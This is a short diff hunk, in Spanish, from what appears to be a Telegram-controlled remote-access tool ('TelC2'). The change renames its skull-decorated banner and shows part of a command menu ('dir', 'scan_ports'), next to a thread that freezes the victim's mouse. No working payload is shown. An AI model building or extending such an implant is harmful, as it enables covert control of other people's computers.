@@ -81,9 +81,9 @@ threading.Thread(target=keep_mouse_frozen, daemon=True).start()
 
 # Lista de comandos disponibles
 COMANDOS = """
-☠️HKN☠️
+☠️HKN - Kamachiq☠️
 
-Comandos disponibles ALONDRA TELC2:
+Comandos disponibles Kamachiq TelC2:
 "hola": ¡Hola! ¿Cómo puedo ayudarte? 👋
 "dir": Lista archivos del directorio actual. 📁
 "scan_ports": Escanea los puertos de la máquina. 🌐
